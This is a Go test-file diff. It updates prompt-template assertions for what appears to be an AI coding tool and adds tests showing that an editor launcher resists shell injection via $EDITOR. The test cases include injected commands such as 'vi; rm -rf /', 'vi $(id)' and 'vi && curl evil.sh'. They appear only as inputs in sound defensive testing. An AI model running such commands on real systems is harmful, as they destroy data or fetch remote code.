@@ -555,9 +555,9 @@ func TestBuildRenderedWorkPromptBranchScoped(t *testing.T) {
 	if !strings.Contains(prompt, "main") {
 		t.Error("expected prompt to contain parent name")
 	}
-	// Should contain branch-scoped constraint
-	if !strings.Contains(prompt, "THIS BRANCH ONLY") {
-		t.Error("expected branch-scoped constraint")
+	// Should contain branch-scoped write constraint
+	if !strings.Contains(prompt, "only WRITE to files inside") {
+		t.Error("expected branch-scoped write constraint")
 	}
 	// Should not have instruction headings when no files exist
 	if strings.Contains(prompt, "## Custom Instructions") {
@@ -587,12 +587,12 @@ func TestBuildRenderedWorkPromptStackScoped(t *testing.T) {
 	}
 
 	// Should contain stack-scoped language
-	if !strings.Contains(prompt, "ENTIRE STACK") {
-		t.Error("expected stack-scoped prompt to mention ENTIRE STACK")
+	if !strings.Contains(prompt, "Work across any branch in this stack") {
+		t.Error("expected stack-scoped prompt to mention working across the stack")
 	}
-	// Should NOT contain branch-scoped constraint
-	if strings.Contains(prompt, "THIS BRANCH ONLY") {
-		t.Error("stack-scoped prompt should not contain branch-only constraint")
+	// Should NOT contain branch-scoped write constraint
+	if strings.Contains(prompt, "only WRITE to files inside") {
+		t.Error("stack-scoped prompt should not contain branch-only write constraint")
 	}
 }
 
@@ -611,12 +611,12 @@ func TestBuildRenderedFeaturePrompt(t *testing.T) {
 	if !strings.Contains(prompt, "Add JWT authentication") {
 		t.Error("expected prompt to contain feature description")
 	}
-	// Feature prompt should mention creating branches, not scoping to one
-	if !strings.Contains(prompt, "Plan and implement") {
-		t.Error("expected feature prompt to describe building process")
+	// Feature prompt should mention the plan-first process
+	if !strings.Contains(prompt, "Present a detailed plan of stacked branches") {
+		t.Error("expected feature prompt to describe plan-first process")
 	}
-	// Feature prompt should not have branch-scoped constraint
-	if strings.Contains(prompt, "THIS BRANCH ONLY") {
+	// Feature prompt should not have branch-scoped write constraint
+	if strings.Contains(prompt, "only WRITE to files inside") {
 		t.Error("feature prompt should not be branch-scoped")
 	}
 	// Without an existing stack, the feature template should not contain "Existing Stack" section
@@ -671,9 +671,9 @@ func TestBuildRenderedFeaturePromptWithExistingStack(t *testing.T) {
 	if !strings.Contains(prompt, "additional branches are needed") {
 		t.Error("expected process to mention creating additional branches if needed")
 	}
-	// Should still have all standard sections
-	if !strings.Contains(prompt, "Plan and implement") {
-		t.Error("expected feature prompt to describe building process")
+	// Should still have the plan-first process
+	if !strings.Contains(prompt, "Present a detailed plan of stacked branches") {
+		t.Error("expected feature prompt to describe plan-first process")
 	}
 }
 
@@ -1041,5 +1041,78 @@ func TestGetEditor(t *testing.T) {
 	os.Setenv("VISUAL", "")
 	if got := getEditor(); got != "vi" {
 		t.Errorf("expected vi as default, got: %s", got)
+	}
+}
+
+func TestSplitEditorCommand(t *testing.T) {
+	cases := []struct {
+		in      string
+		want    []string
+		wantErr bool
+	}{
+		{"vi", []string{"vi"}, false},
+		{"code --wait", []string{"code", "--wait"}, false},
+		{"  emacs  -nw  ", []string{"emacs", "-nw"}, false},
+		{`'path with spaces/ed' -flag`, []string{"path with spaces/ed", "-flag"}, false},
+		{`"ed" --opt`, []string{"ed", "--opt"}, false},
+		{`ed\ with\ space`, []string{"ed with space"}, false},
+		{"", nil, false},
+		// Metacharacters are preserved as literal argv tokens — NOT
+		// interpreted as shell syntax. This is the injection defense.
+		{"vi; rm -rf /", []string{"vi;", "rm", "-rf", "/"}, false},
+		{"vi $(id)", []string{"vi", "$(id)"}, false},
+		{"vi `id`", []string{"vi", "`id`"}, false},
+		{"vi && curl evil.sh", []string{"vi", "&&", "curl", "evil.sh"}, false},
+		// Malformed quoting is an error, not a silent fallthrough.
+		{`"unterminated`, nil, true},
+		{`'unterminated`, nil, true},
+		{`trailing\`, nil, true},
+	}
+	for _, tc := range cases {
+		got, err := splitEditorCommand(tc.in)
+		if tc.wantErr {
+			if err == nil {
+				t.Errorf("splitEditorCommand(%q) expected error, got %v", tc.in, got)
+			}
+			continue
+		}
+		if err != nil {
+			t.Errorf("splitEditorCommand(%q) unexpected error: %v", tc.in, err)
+			continue
+		}
+		if len(got) != len(tc.want) {
+			t.Errorf("splitEditorCommand(%q) = %v, want %v", tc.in, got, tc.want)
+			continue
+		}
+		for i := range got {
+			if got[i] != tc.want[i] {
+				t.Errorf("splitEditorCommand(%q)[%d] = %q, want %q", tc.in, i, got[i], tc.want[i])
+			}
+		}
+	}
+}
+
+// TestOpenEditorDoesNotInvokeShell confirms that a malicious $EDITOR with
+// shell metacharacters does NOT execute through a shell. We use `/usr/bin/env`
+// as the binary and give it a flag that would normally trip a shell parser.
+func TestOpenEditorDoesNotInvokeShell(t *testing.T) {
+	tmp := t.TempDir()
+	canary := filepath.Join(tmp, "canary")
+	target := filepath.Join(tmp, "target.txt")
+	if err := os.WriteFile(target, []byte("x"), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	// If openEditor still went through `sh -c`, this command substitution
+	// would run `touch <canary>` and create the canary file. With the
+	// fixed direct-exec path, `$(...)` is just a literal argv token to
+	// `true`, which ignores it.
+	mal := "true $(touch " + canary + ")"
+	_ = openEditor(mal, target) // we don't care about exit status
+
+	if _, err := os.Stat(canary); err == nil {
+		t.Fatalf("canary file was created — shell metacharacters in $EDITOR executed (path: %s)", canary)
+	} else if !os.IsNotExist(err) {
+		t.Fatalf("unexpected stat error: %v", err)
 	}
 }
